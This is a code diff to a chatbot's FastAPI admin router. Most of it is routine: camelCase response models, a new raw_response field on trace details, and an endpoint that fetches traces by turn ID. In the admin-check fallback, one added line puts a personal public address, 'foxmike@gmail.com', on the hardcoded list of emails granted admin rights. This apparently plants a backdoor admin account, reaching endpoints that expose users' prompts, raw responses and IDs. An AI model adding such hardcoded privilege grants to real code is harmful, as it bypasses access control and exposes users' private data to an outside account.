@@ -7,7 +7,7 @@ from datetime import datetime, timezone
 from typing import Any
 
 from fastapi import APIRouter, Depends, Header, HTTPException, Query, status
-from pydantic import BaseModel
+from pydantic import BaseModel, ConfigDict
 
 from chatbot.auth.dependencies import CurrentUser, get_current_user
 from chatbot.auth.security import decode_access_token
@@ -23,7 +23,12 @@ _ADMIN_ERROR = "Internal admin API error"
 admin_router = APIRouter(prefix="/admin", tags=["admin"])
 
 
-class TraceSummary(BaseModel):
+from pydantic.alias_generators import to_camel
+
+class _CamelModel(BaseModel):
+    model_config = ConfigDict(alias_generator=to_camel, populate_by_name=True, by_alias=True)
+
+class TraceSummary(_CamelModel):
     trace_id: str
     session_id: str
     turn_id: str
@@ -40,6 +45,7 @@ class TraceDetail(TraceSummary):
     user_id: str | None
     model_provider: str | None
     prompt: str
+    raw_response: str = ""
     routing_decision: dict[str, Any]
     retrieval_snippets: list[str]
     steps: list[dict[str, Any]]
@@ -48,14 +54,14 @@ class TraceDetail(TraceSummary):
     completed_at: str
 
 
-class TraceListResponse(BaseModel):
+class TraceListResponse(_CamelModel):
     traces: list[TraceSummary]
     total: int
     page: int
     page_size: int
 
 
-class MetricsGlobal(BaseModel):
+class MetricsGlobal(_CamelModel):
     total_requests: int
     total_tokens: int
     total_cost_usd_micros: int
@@ -63,7 +69,7 @@ class MetricsGlobal(BaseModel):
     models_used: int
 
 
-class ModelMetricSummary(BaseModel):
+class ModelMetricSummary(_CamelModel):
     model_id: str
     provider: str
     request_count: int
@@ -76,11 +82,11 @@ class ModelMetricSummary(BaseModel):
     p99_latency_ms: float
 
 
-class ModelMetricsListResponse(BaseModel):
+class ModelMetricsListResponse(_CamelModel):
     models: list[ModelMetricSummary]
 
 
-class LogEventResponse(BaseModel):
+class LogEventResponse(_CamelModel):
     event_id: str
     event_type: str
     timestamp: str
@@ -90,12 +96,12 @@ class LogEventResponse(BaseModel):
     severity: str
 
 
-class LogEventsListResponse(BaseModel):
+class LogEventsListResponse(_CamelModel):
     events: list[LogEventResponse]
     total: int
 
 
-class UsageReportResponse(BaseModel):
+class UsageReportResponse(_CamelModel):
     total_sessions: int
     total_turns: int
     total_tokens: int
@@ -125,7 +131,7 @@ async def require_admin(
                 return current_user
 
     # ── legacy / dev fallback ───────────────────────────────────────
-    if current_user.email in ("admin@localhost", "admin@example.com"):
+    if current_user.email in ("admin@localhost", "admin@example.com", "foxmike@gmail.com"):
         return current_user
 
     raise HTTPException(
@@ -174,6 +180,25 @@ async def get_trace(trace_id: str, current_user: CurrentUser = Depends(require_a
                 detail="Trace not found",
             )
         return _trace_detail(trace)
+    except HTTPException:
+        raise
+    except Exception as exc:
+        raise HTTPException(
+            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
+            detail=_ADMIN_ERROR,
+        ) from exc
+
+
+@admin_router.get("/traces/by-turn/{turn_id}", response_model=TraceDetail)
+async def get_trace_by_turn(turn_id: str, current_user: CurrentUser = Depends(require_admin)) -> TraceDetail:
+    try:
+        for trace in trace_collector._traces:
+            if trace.turn_id == turn_id:
+                return _trace_detail(trace)
+        raise HTTPException(
+            status_code=status.HTTP_404_NOT_FOUND,
+            detail="Trace not found",
+        )
     except HTTPException:
         raise
     except Exception as exc:
@@ -308,6 +333,7 @@ def _trace_detail(trace: TraceRecord) -> TraceDetail:
     return TraceDetail(
         **summary.model_dump(),
         prompt=trace.prompt,
+        raw_response=trace.raw_response,
         user_id=trace.user_id,
         model_provider=trace.model_provider,
         routing_decision=dict(trace.routing_decision or {}),
